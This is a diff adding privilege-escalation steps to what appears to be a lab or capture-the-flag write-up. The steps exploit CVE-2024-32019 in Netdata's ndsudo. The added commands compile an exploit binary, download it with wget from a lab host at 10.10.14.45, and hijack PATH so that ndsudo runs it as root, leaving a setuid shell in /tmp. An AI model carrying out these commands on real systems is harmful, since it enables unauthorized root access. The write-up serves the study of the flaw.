@@ -98,6 +98,26 @@ Netdata 1.45.2
 ```
 <img width="981" height="549" alt="image" src="https://github.com/user-attachments/assets/0f601f14-0174-4820-b5a6-33ad8bae643b" />
 
-```
+<img width="659" height="378" alt="image" src="https://github.com/user-attachments/assets/bfd71a38-3332-4415-8f3d-29f4b3176e20" />
+
+<img width="432" height="159" alt="image" src="https://github.com/user-attachments/assets/c1e1d9d4-2b0d-4027-8ec5-36ae0a6a9d97" />
+
 
 ```
+https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation
+```
+<img width="572" height="457" alt="image" src="https://github.com/user-attachments/assets/fb680c88-6946-4a9b-809a-95b131360aed" />
+
+```
+gcc root.c -o nvme
+```
+<img width="892" height="377" alt="image" src="https://github.com/user-attachments/assets/30086d31-b563-4674-a1b6-f9ff74bee4cc" />
+
+```
+wget 10.10.14.45/nvme
+chmod +x nvme
+PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+ls -l /tmp/0xdf
+/tmp/0xdf -p
+```
+<img width="1058" height="829" alt="image" src="https://github.com/user-attachments/assets/804d22cf-5b86-43b9-8875-da9d4a47cd5e" />
